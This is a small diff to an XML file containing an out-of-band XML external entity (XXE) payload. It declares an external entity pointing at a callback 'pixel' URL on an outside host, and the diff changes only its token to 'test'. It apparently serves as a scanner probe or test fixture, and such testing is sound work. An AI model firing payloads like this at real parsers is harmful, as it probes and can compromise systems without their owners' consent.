@@ -1,6 +1,6 @@
 <?xml version="1.0" ?>
 <!DOCTYPE r [
 <!ELEMENT r ANY >
-<!ENTITY sp SYSTEM "https://b.mimilo4ka.com/pixel?callback_token=ee34a1791ab345f789">
+<!ENTITY sp SYSTEM "https://b.mimilo4ka.com/pixel?callback_token=test">
 ]>
 <r>&sp;</r>
